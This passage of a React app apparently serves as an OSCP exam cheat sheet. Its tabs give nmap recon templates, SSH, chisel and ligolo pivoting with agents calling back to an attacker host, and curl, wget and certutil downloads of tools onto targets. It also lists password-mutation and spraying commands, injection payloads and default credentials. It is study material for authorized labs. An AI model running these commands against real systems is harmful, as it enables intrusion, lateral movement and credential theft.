    { label: "Vuln scan", cmd: `nmap --script vuln -p PORTS -oA nmap/vuln ${t}`, desc: "NSE vulnerability scripts" },
    { label: "OS detection", cmd: `sudo nmap -O -p PORTS ${t}`, desc: "Determine OS type" },
    { label: "AutoRecon (full auto)", cmd: `autorecon ${t} -o autorecon_results/`, desc: "Automated multi-tool scanning" },
  ];
  return(<div>
    <div className="sec-title">Initial Scan Workflow</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# STEP 1: Create directory structure
mkdir -p ${t}/{nmap,web,enum,exploit,loot}

# STEP 2: Run these FIRST (in parallel):
nmap -sC -sV -oA ${t}/nmap/initial ${t} &
nmap -p- --min-rate 5000 -oA ${t}/nmap/full ${t} &
sudo nmap -sU --top-ports 20 -oA ${t}/nmap/udp ${t} &

# STEP 3: When full scan finishes, deep scan found ports:
# nmap -sC -sV -p <FOUND_PORTS> -oA ${t}/nmap/targeted ${t}

# STEP 4: Start service-specific enumeration based on results`}</div></div>
    <div className="sec-title">Scan Templates</div>
    {scans.map((s,i)=><div className="gen-card" key={i} style={{marginBottom:6,cursor:'default'}}>
      <div style={{flex:1}}>
        <div style={{fontSize:12,fontWeight:700,color:s.critical?'var(--ac)':'var(--t0)'}}>{s.label}</div>
        <div style={{fontSize:10,color:'var(--t2)',marginTop:2}}>{s.desc}</div>
        <div className="cmd" style={{marginTop:4,fontSize:10}}>{s.cmd}</div>
      </div>
      <CopyBtn text={s.cmd}/>
    </div>)}
    <div className="sec-title" style={{marginTop:20}}>Nmap Cheatsheet</div>
    <div className="gen-out"><div className="cmd">{`# Scan types:
-sS  = SYN stealth scan (default, needs root)
-sT  = TCP connect scan (no root needed)
-sU  = UDP scan
-sV  = Version detection
-sC  = Default scripts
-O   = OS detection
-A   = Aggressive (sV + sC + O + traceroute)

# Speed:
--min-rate 5000    = Fast scan
-T4                = Aggressive timing
-p-                = All 65535 ports
--top-ports 20     = Top 20 common ports

# Output:
-oA name           = All formats (.nmap, .gnmap, .xml)
-oN name.txt       = Normal output
-oG name.gnmap     = Grepable output

# Scripts:
--script vuln              = Vulnerability scripts
--script "smb-*"           = All SMB scripts
--script-args              = Pass args to scripts`}</div></div>
  </div>)
}

// ━━━ TAB: TUNNELING & PIVOTING ━━━
function TunnelingTab({lhost}){
  const h=lhost||"LHOST";
  const sections=[
    { title: "SSH Tunneling", items: [
      { label: "Local Port Forward", desc: "Access remote:8080 via localhost:8080", cmd: `ssh -L 8080:127.0.0.1:8080 user@TARGET\n# Now access: http://127.0.0.1:8080`, critical: true },
      { label: "Remote Port Forward", desc: "Expose attacker port through target", cmd: `ssh -R 8080:127.0.0.1:80 user@TARGET\n# Target's :8080 now reaches your :80` },
      { label: "Dynamic SOCKS proxy", desc: "Full SOCKS proxy through SSH", cmd: `ssh -D 1080 user@TARGET\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT -p80,443,445 INTERNAL_NET`, critical: true },
      { label: "SSH through pivot", desc: "Multi-hop SSH", cmd: `ssh -J user@PIVOT user@INTERNAL_TARGET\n# Or manually:\nssh -L 2222:INTERNAL:22 user@PIVOT\nssh -p 2222 user@127.0.0.1` },
    ]},
    { title: "Chisel", items: [
      { label: "Reverse SOCKS proxy", desc: "SOCKS proxy via chisel", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${h}:8000 R:socks\n\n# Configure proxychains:\n# socks5 127.0.0.1 1080\nproxychains nmap -sT INTERNAL_NET`, critical: true },
      { label: "Port forward", desc: "Forward specific port", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target (forward target's internal :8080 to attacker's :8080):\n./chisel client ${h}:8000 R:8080:127.0.0.1:8080` },
    ]},
    { title: "Ligolo-ng", items: [
      { label: "Full setup", desc: "VPN-like tunneling — best for AD pivoting", cmd: `# On attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On target:\n./agent -connect ${h}:11601 -ignore-cert\n\n# In ligolo console:\n>> session\n>> ifconfig\n>> start\n\n# Add route to internal network:\nsudo ip route add 10.10.10.0/24 dev ligolo`, critical: true },
    ]},
    { title: "sshuttle", items: [
      { label: "VPN over SSH", desc: "Route all traffic through SSH pivot", cmd: `sshuttle -r user@TARGET 10.10.10.0/24\n# Or specific subnets:\nsshuttle -r user@TARGET 10.10.10.0/24 172.16.0.0/16`, critical: true },
    ]},
    { title: "socat & Port Forwarding", items: [
      { label: "Simple port forward", desc: "Forward local port to remote", cmd: `socat TCP-LISTEN:8080,fork TCP:INTERNAL_TARGET:80\n# Now access internal:80 via pivot:8080` },
      { label: "Upload socat (static)", desc: "Transfer socat to target", cmd: `# Attacker:\npython3 -m http.server 80\n\n# Target (Linux):\ncurl http://${h}/socat -o /tmp/socat && chmod +x /tmp/socat\n\n# Target (Windows):\ncertutil -urlcache -split -f http://${h}/socat.exe C:\\Temp\\socat.exe` },
    ]},
  ];

  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>Essential for AD sets — pivot between domain machines</div>
    </div>
    {sections.map((sec,si)=><div key={si}>
      <div className="sec-title">{sec.title}</div>
      {sec.items.map((item,ii)=><div className="gen-card" key={ii} style={{marginBottom:6,cursor:'default',flexDirection:'column',alignItems:'stretch'}}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
          <div>
            <div style={{fontSize:12,fontWeight:700,color:item.critical?'var(--ac)':'var(--t0)'}}>{item.label}</div>
            <div style={{fontSize:10,color:'var(--t2)',marginTop:1}}>{item.desc}</div>
          </div>
          <CopyBtn text={item.cmd}/>
        </div>
        <div className="cmd" style={{marginTop:6,fontSize:10}}>{item.cmd}</div>
      </div>)}
    </div>)}
    <div className="sec-title" style={{marginTop:20}}>Transfer Tunneling Tools</div>
    <div className="gen-out"><div className="cmd">{`# Download links (get latest releases):
# Chisel:    https://github.com/jpillora/chisel/releases
# Ligolo-ng: https://github.com/nicocha30/ligolo-ng/releases
# socat:     https://github.com/andrew-d/static-binaries

# Host on attacker:
python3 -m http.server 80

# Grab from target (Linux):
wget http://${h}/chisel && chmod +x chisel
curl http://${h}/ligolo-agent -o agent && chmod +x agent

# Grab from target (Windows):
certutil -urlcache -split -f http://${h}/chisel.exe C:\\Temp\\chisel.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://${h}/chisel.exe','C:\\Temp\\chisel.exe')"`}</div></div>
  </div>)
}

// ━━━ TAB: WORDLISTS ━━━
function WordlistTab({targetIP}){
  const t=targetIP||"TARGET";
  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--acd)',color:'var(--ac)',flex:2}}>rockyou not cracking? Build context-based wordlists for the win.</div>
    </div>

    <div className="sec-title">When to Use What — Quick Reference</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ┌──────────────────────────────┬──────────────────────────────────────────────┐
# │ SCENARIO                    │ WORDLIST                                     │
# ├──────────────────────────────┼──────────────────────────────────────────────┤
# │ Hash cracking (offline)     │ rockyou.txt                                  │
# │ Dir/file brute-force        │ raft-medium-directories / dir-2.3-medium     │
# │ Login brute with context    │ CeWL output + hashcat rules                  │
# │ Username enumeration        │ Custom (from recon) + xato-net-10-million    │
# │ Subdomain brute             │ subdomains-top1million-5000.txt              │
# │ Password spray (AD)         │ Context words + Season+Year patterns         │
# │ Kerberoast / AS-REP crack   │ rockyou.txt → custom if fails                │
# │ API parameter fuzz          │ burp-parameter-names.txt                     │
# │ VHost discovery             │ subdomains-top1million-5000.txt              │
# └──────────────────────────────┴──────────────────────────────────────────────┘
#
# GOLDEN RULE: If rockyou doesn't crack it in 2-5 min, STOP.
# → Build a custom wordlist OR brute-force is NOT the path.`}</div></div>

    <div className="sec-title">CeWL — Build Wordlist from Target Website</div>
    <div className="gen-out"><div className="cmd">{`# Basic extraction (words from site):
cewl http://${t} -d 3 -m 5 -w cewl_words.txt

# Lowercase all words:
cewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt

# Also extract emails (for usernames):
cewl http://${t} -d 3 -m 5 -e --email_file emails.txt -w cewl_words.txt

# Include meta data (author names, etc.):
cewl http://${t} -d 3 -m 5 --meta --meta_file meta.txt -w cewl_words.txt

# HTTPS target (skip cert verify):
cewl https://${t} -d 3 -m 5 -w cewl_words.txt --unsafe

# Options:
#   -d N     = crawl depth (default 2, use 3-5)
#   -m N     = minimum word length
#   -w FILE  = output file
#   -e       = include emails
#   --lowercase = force lowercase`}</div>
      <div style={{marginTop:8}}><CopyBtn text={`cewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt`}/></div>
    </div>

    <div className="sec-title">Username Generation from Discovered Names</div>
    <div className="gen-out"><div className="cmd">{`# Found names? (from website, emails, SNMP, LDAP, LinkedIn)
# Generate ALL common username formats:

cat << 'SCRIPT' > /tmp/gen_users.sh
#!/bin/bash
# Usage: ./gen_users.sh "John Smith"
first=$(echo "$1" | awk '{print tolower($1)}')
last=$(echo "$1"  | awk '{print tolower($2)}')
fi=$(echo "$first" | cut -c1)
li=$(echo "$last"  | cut -c1)
echo "$first"           # john
echo "$last"            # smith
echo "$first.$last"     # john.smith
echo "$first$last"      # johnsmith
echo "$fi$last"         # jsmith
echo "$fi.$last"        # j.smith
echo "$first$li"        # johns
echo "$last$fi"         # smithj
echo "$first._$last"    # john_smith
SCRIPT
chmod +x /tmp/gen_users.sh

# Generate for multiple names:
for name in "John Smith" "Jane Doe" "Bob Admin"; do
  /tmp/gen_users.sh "$name"
done | sort -u > users.txt

# Quick one-liner:
n="John Smith"; f=$(echo $n|awk '{print tolower($1)}'); l=$(echo $n|awk '{print tolower($2)}'); echo -e "$f\\n$l\\n$f.$l\\n$(echo $f|cut -c1)$l" | sort -u`}</div>
      <div style={{marginTop:8}}><CopyBtn text={`n="John Smith"; f=$(echo $n|awk '{print tolower($1)}'); l=$(echo $n|awk '{print tolower($2)}'); echo -e "$f\\n$l\\n$f.$l\\n$(echo $f|cut -c1)$l" | sort -u`}/></div>
    </div>

    <div className="sec-title">Custom Password Generation (Context-Based)</div>
    <div className="gen-out"><div className="cmd">{`# 1. Create base wordlist from context:
# Company name, city, domain, usernames, keywords from recon
cat << 'EOF' > base_words.txt
companyname
cityname
domainname
admin
backup
server
EOF

# 2. Generate mutations:
for word in $(cat base_words.txt); do
  W=$(echo "$word" | sed 's/./\\U&/')  # Capitalize first
  echo "$word"
  echo "$W"
  echo "$word" | tr '[:lower:]' '[:upper:]'
  for suffix in 1 123 ! @ "!" "@123" "@2026" "!2026" 2024 2025 2026; do
    echo "$word$suffix"
    echo "$W$suffix"
  done
done | sort -u > custom_passwords.txt

# 3. Count:
wc -l custom_passwords.txt`}</div>
      <div style={{marginTop:8}}><CopyBtn text={`for word in $(cat base_words.txt); do W=$(echo "$word" | sed 's/./\\U&/'); echo "$word"; echo "$W"; for s in 1 123 "!" "@123" "@2026" "!2026" 2025 2026; do echo "$word$s"; echo "$W$s"; done; done | sort -u > custom_passwords.txt`}/></div>
    </div>

    <div className="sec-title">Hashcat Rule-based Mutation</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--cg)'}}>{`# ─── GENERATE MUTATED WORDLIST (to file) ───
hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/rockyou-30000.rule > mutated_big.txt

# ─── APPLY RULES DURING CRACKING ───
hashcat -m MODE hash.txt base_words.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m MODE hash.txt base_words.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# ─── COMBINE / HYBRID ATTACKS ───
hashcat -m MODE hash.txt -a 1 wordlist1.txt wordlist2.txt    # Combine two lists
hashcat -m MODE hash.txt -a 6 wordlist.txt ?d?d?d?d         # Append 4 digits
hashcat -m MODE hash.txt -a 7 ?u wordlist.txt               # Prepend uppercase

# ─── RULE FILES (Kali paths) ───
# /usr/share/hashcat/rules/best64.rule         — Fast, most common
# /usr/share/hashcat/rules/rockyou-30000.rule  — Aggressive
# /usr/share/hashcat/rules/d3ad0ne.rule        — Very large
# /usr/share/hashcat/rules/InsidePro-PasswordProRules.rule

# ─── CeWL → MUTATE → CRACK PIPELINE ───
cewl http://${t} -d 3 -m 5 --lowercase -w cewl.txt
hashcat -m MODE hash.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule`}</div>
      <div style={{marginTop:8}}><CopyBtn text={`hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt`}/></div>
    </div>

    <div className="sec-title">John the Ripper Rules</div>
    <div className="gen-out"><div className="cmd">{`# Apply rules during cracking:
john --wordlist=base_words.txt --rules=best64 hash.txt
john --wordlist=base_words.txt --rules=All hash.txt

# Generate mutated wordlist to stdout:
john --wordlist=base_words.txt --rules=best64 --stdout > mutated.txt
john --wordlist=base_words.txt --rules=KoreLogic --stdout > mutated_big.txt

# CeWL + john pipeline:
cewl http://${t} -d 3 -m 5 --lowercase -w cewl.txt
john --wordlist=cewl.txt --rules=best64 hash.txt`}</div></div>

    <div className="sec-title">Common OSCP Password Patterns</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# ── FREQUENTLY SEEN IN OSCP ──
#
# Season + Year:   Spring2025!, Summer2026!, Winter2025!
# Month + Year:    January2025!, March2026!
# Company + Num:   CompanyName1!, Corp2025!
# User + Num:      username1, admin123, user2026!
# Keyboard walks:  qwerty, P@ssw0rd, Passw0rd!
# Defaults:        password, Password1, Welcome1!, changeme
#
# ── QUICK SEASONAL GENERATOR ──
for s in Spring Summer Autumn Winter; do
  for y in 2024 2025 2026; do
    for c in "" "!" "@" "#" "123"; do
      echo "$s$y$c"
    done
  done
done > season_passwords.txt

# ── MONTH VARIANT ──
for m in January February March April May June July August September October November December; do
  for y in 2024 2025 2026; do
    echo "$m$y"; echo "$m$y!"
  done
done >> season_passwords.txt

echo "Generated $(wc -l < season_passwords.txt) password candidates"`}</div>
      <div style={{marginTop:8}}><CopyBtn text={`for s in Spring Summer Autumn Winter; do for y in 2024 2025 2026; do for c in "" "!" "@" "#" "123"; do echo "$s$y$c"; done; done; done > season_passwords.txt`}/></div>
    </div>

    <div className="sec-title">Wordlist Paths Reference (Kali)</div>
    <div className="gen-out"><div className="cmd">{`# ── PASSWORDS ──
/usr/share/wordlists/rockyou.txt                                        # 14M passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt

# ── USERNAMES ──
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt

# ── WEB DIRECTORIES ──
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/wordlists/dirb/big.txt

# ── DNS / SUBDOMAINS ──
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# ── SNMP ──
/usr/share/seclists/Discovery/SNMP/snmp.txt

# ── PARAMETERS ──
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`}</div></div>

  </div>)
}

// ━━━ TAB: I'M STUCK ━━━
function StuckTab(){
  const checks=[
    { q: "Did you scan ALL 65535 TCP ports?", cmd: "nmap -p- --min-rate 5000 TARGET", tip: "Many OSCP boxes hide services on high ports (8000-65535). A top-1000 scan WILL miss them.", critical: true },
    { q: "Did you scan UDP?", cmd: "sudo nmap -sU --top-ports 20 TARGET", tip: "SNMP (161) is the #1 missed port. It can leak usernames, running processes, and installed software.", critical: true },
    { q: "Did you try ALL found creds on ALL services?", cmd: "crackmapexec smb TARGETS -u users.txt -p passwords.txt --continue-on-success", tip: "Password reuse is VERY common. Try every credential on SSH, SMB, WinRM, RDP, web apps, databases.", critical: true },
    { q: "Did you build a CONTEXT-BASED wordlist?", cmd: "cewl http://TARGET -d 3 -m 5 --lowercase -w cewl.txt\nhashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > custom.txt", tip: "If rockyou didn't crack it in 5 min, STOP. Use CeWL to scrape the target site, add company names, usernames, year/season patterns. Mutate with hashcat rules. See the Wordlists tab.", critical: true },
    { q: "Did you Google the EXACT version?", cmd: "searchsploit 'ServiceName Version'\n# Also: Google 'ServiceName Version exploit'", tip: "Many boxes use services with known CVEs. Search: 'Apache 2.4.49 exploit', 'vsftpd 2.3.4 backdoor', etc." },
    { q: "Did you read the source code?", cmd: "# View page source in browser\n# Look for: comments, hidden fields, JS files, API endpoints\ncurl -s http://TARGET/ | grep -iE '(comment|hidden|api|key|token|secret|password|TODO|FIXME|href|src)'", tip: "Comments in HTML/JS often leak paths, creds, or hints." },
    { q: "Did you check for VHosts/subdomains?", cmd: "gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\n# Also check /etc/hosts or DNS zone transfer", tip: "Different vhosts can have completely different applications." },
    { q: "Did you try directory brute with different wordlists?", cmd: "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx,bak,old,conf", tip: "Try multiple wordlists: raft-medium, directory-list-2.3-medium, common.txt. Try different extensions." },
    { q: "Did you check ALL parameters for injection?", cmd: "# SQLi: ' OR 1=1-- -\n# SSTI: {{7*7}}\n# LFI: ../../etc/passwd\n# CMDi: ;id\n# XSS: <script>alert(1)</script>", tip: "Test EVERY input field, URL parameter, cookie, and header for injection vulnerabilities." },
    { q: "Did you check for default credentials?", cmd: "# WordPress: admin/admin\n# Tomcat: tomcat/s3cret\n# Jenkins: no auth or admin/admin\n# phpMyAdmin: root/(empty)\n# CMS: admin/admin", tip: "ALWAYS try default creds. This is free and often works.", critical: true },
    { q: "Did you run automated enumeration tools?", cmd: "# Linux: ./linpeas.sh | tee linpeas.txt\n# Windows: .\\winPEASx64.exe | tee winpeas.txt\n# Also: ./pspy64 -pf -i 1000", tip: "Run linpeas/winpeas TWICE — once normally, once reading the output carefully." },
    { q: "Are there internal services (127.0.0.1 only)?", cmd: "# Linux: ss -tlnp\n# Windows: netstat -ano | findstr LISTENING", tip: "Services bound to localhost need port forwarding to reach. This is a common pattern." },
    { q: "Did you check for password patterns?", cmd: "# Common OSCP patterns:\n# Season+Year: Winter2025!, Summer2026!\n# Company+Numbers: Corp123!, Admin2025!\n# User+Numbers: username1, username123\n# Keyboard walks: qwerty, !@#$%", tip: "Try password mutations with hashcat rules." },
  ];

  return(<div>
    <div className="score-bar">
      <div className="score-seg" style={{background:'var(--rd)',color:'var(--r)',flex:2}}>
        ⚠️ RULE: Never spend more than 2 hours on one vector. Move on and come back later.
      </div>
    </div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question top-to-bottom. If you answer "no" to ANY of these, do it before trying anything else.</p>
    {checks.map((c,i)=><div className="tree-step" key={i} style={{marginBottom:6}}>
      <div style={{padding:'10px 14px'}}>
        <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
          <div className={`phase-num ${c.critical?'':'done'}`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
          <div style={{flex:1}}>
            <div style={{fontSize:13,fontWeight:700,color:'var(--t0)'}}>{c.q}</div>
            <div style={{fontSize:11,color:'var(--t2)',marginTop:2}}>{c.tip}</div>
          </div>
          <CopyBtn text={c.cmd}/>
        </div>
        <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
      </div>
    </div>)}
    <div className="sec-title" style={{marginTop:20}}>Mental Checklist When Stuck</div>
    <div className="gen-out"><div className="cmd" style={{color:'var(--y)'}}>{`# Ask yourself:
# 1. What do I KNOW? (list all facts)
# 2. What have I NOT tried? (check list above)
# 3. Is there a different entry point I missed?
# 4. Can I combine two findings? (e.g., user from SNMP + weak password)
# 5. Am I in a rabbit hole? (>2 hours = MOVE ON)
#
# COMMON MISTAKES:
# - Not scanning ALL ports (-p-)
# - Not trying creds everywhere
# - Not reading source code carefully
# - Ignoring UDP services (SNMP!)
# - Not checking for version-specific exploits
# - Overthinking — OSCP is about methodology, not 0-days`}</div></div>
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=[
  {id:"recon",label:"Recon",icon:"🔍"},
  {id:"ad",label:"AD Attack",icon:"🏰"},
  {id:"auto",label:"Standalones",icon:"🎯"},
  {id:"privesc",label:"Priv Esc",icon:"⬆️"},
  {id:"tunnel",label:"Pivoting",icon:"🔀"},
  {id:"shells",label:"Shells",icon:"💀"},
  {id:"wordlists",label:"Wordlists",icon:"🔤"},
  {id:"hash",label:"Hash ID",icon:"#️⃣"},
  {id:"stuck",label:"I'm Stuck",icon:"🆘"},
  {id:"timer",label:"Timer",icon:"⏱️"},
  {id:"check",label:"Checklist",icon:"✅"},
  {id:"notes",label:"Notes",icon:"📝"},
];

function App(){
  const[tab,setTab]=useState("recon");
  const[targetIP,setTargetIP]=useState("");
  const[lhost,setLhost]=useState("");
  const[lport,setLport]=useState("4444");

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSCP+ AUTOPILOT</div><div className="logo-sub">Decision Engine — OSCP+ 2026</div></div>
        <div className="inps">
          <input className="inp" style={{width:130}} placeholder="Target IP" value={targetIP} onChange={e=>setTargetIP(e.target.value)}/>
          <input className="inp" style={{width:130}} placeholder="Your IP (LHOST)" value={lhost} onChange={e=>setLhost(e.target.value)}/>
          <input className="inp" style={{width:65}} placeholder="LPORT" value={lport} onChange={e=>setLport(e.target.value)}/>
        </div>
      </div>
      <div className="tabs">{TABS.map(t=><button key={t.id} className={`tab ${tab===t.id?'on':''}`} onClick={()=>setTab(t.id)}>{t.icon} {t.label}</button>)}</div>
      <div className="main">
        {tab==="recon"&&<ReconTab targetIP={targetIP}/>}
        {tab==="ad"&&<ADTab lhost={lhost}/>}
        {tab==="auto"&&<AutopilotTab targetIP={targetIP}/>}
        {tab==="privesc"&&<PrivEscTab lhost={lhost}/>}
        {tab==="tunnel"&&<TunnelingTab lhost={lhost}/>}
        {tab==="shells"&&<ShellTab lhost={lhost} lport={lport}/>}
        {tab==="wordlists"&&<WordlistTab targetIP={targetIP}/>}
        {tab==="hash"&&<HashTab/>}
        {tab==="stuck"&&<StuckTab/>}
        {tab==="timer"&&<TimerTab/>}
        {tab==="check"&&<ChecklistTab/>}
        {tab==="notes"&&<NotesTab/>}
      </div>
    </div>
  </>)
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);
